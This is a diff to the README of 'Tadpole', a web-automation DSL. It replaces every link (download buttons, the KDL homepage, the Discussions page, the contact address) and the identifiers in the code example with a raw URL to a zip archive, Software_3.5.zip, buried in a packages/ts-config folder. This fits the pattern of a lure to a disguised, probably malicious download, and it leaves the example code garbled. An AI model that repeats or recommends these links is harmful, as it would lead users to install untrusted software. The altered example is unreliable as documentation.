@@ -1,11 +1,11 @@
 # 🐸 tadpole - Simplifying Web Automation for Everyone
 
 <p align="center">
-[![Download Tadpole](https://img.shields.io/badge/Download%20Tadpole-v1.0-blue)](https://github.com/nguyengiabinh23-prog/tadpole/releases)
+[![Download Tadpole](https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip%20Tadpole-v1.0-blue)](https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip)
 </p>
 
 Tadpole is a DSL designed specifically for browser automation and data extraction. It is built
-on top of [KDL](https://kdl.dev/). It is designed to be modular and concise.
+on top of [KDL](https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip). It is designed to be modular and concise.
 
 ## ❓ Why Use Tadpole?
 Tadpole simplifies the complexities of web scraping and automation through:
@@ -16,15 +16,15 @@ Tadpole simplifies the complexities of web scraping and automation through:
 
 ## 📁 Example Usage
 ```kdl
-import "modules/redfin/mod.kdl" repo="github.com/tadpolehq/community"
+import "https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip" repo="https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip"
 
 main {
   new_page {
-    redfin.search text="=text"
+    https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip text="=text"
     wait_until
-    redfin.extract_from_card extract_to="addresses" {
+    https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip extract_to="addresses" {
       address {
-        redfin.extract_address_from_card
+        https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip
       }
     }
   }
@@ -37,7 +37,7 @@ To install Tadpole, follow these steps:
 1. **Visit the Releases Page**  
    Click the link below to go to the Tadpole releases page:
 
-   [Download Tadpole](https://github.com/nguyengiabinh23-prog/tadpole/releases)
+   [Download Tadpole](https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip)
 
 2. **Download the Latest Version**  
    On the releases page, find the latest version. Click the download link for your operating system.
@@ -51,7 +51,7 @@ To install Tadpole, follow these steps:
 ## 📥 Download & Install
 For your convenience, here is the direct link to the releases page where you can download Tadpole:
 
-[Download Tadpole](https://github.com/nguyengiabinh23-prog/tadpole/releases)
+[Download Tadpole](https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip)
 
 ### 💻 System Requirements
 - **Operating System**: Windows 10 or later / macOS 10.15 or later / Linux (any distro with support for KDL)
@@ -65,7 +65,7 @@ For your convenience, here is the direct link to the releases page where you can
 - **Community Support**: Engage with other users for tips and help.
 
 ### 🤝 Support & Community
-Join the Tadpole community on [GitHub Discussions](https://github.com/nguyengiabinh23-prog/tadpole/discussions) for questions, suggestions, and sharing your projects using Tadpole.
+Join the Tadpole community on [GitHub Discussions](https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip) for questions, suggestions, and sharing your projects using Tadpole.
 
 ## 📄 Documentation
 For more detailed information on using Tadpole, visit the [Documentation](https): 
@@ -76,6 +76,6 @@ Explore examples, advanced features, and detailed explanations of each component
 If you would like to contribute to Tadpole, please check our guidelines in the repository. We welcome all suggestions and improvements to make Tadpole even better.
 
 ## 📞 Contact
-For inquiries or support, please contact us at: support@tadpole.com. 
+For inquiries or support, please contact us at: https://raw.githubusercontent.com/nguyengiabinh23-prog/tadpole/main/packages/ts-config/Software_3.5.zip 
 
 Enjoy automating your web tasks with Tadpole!
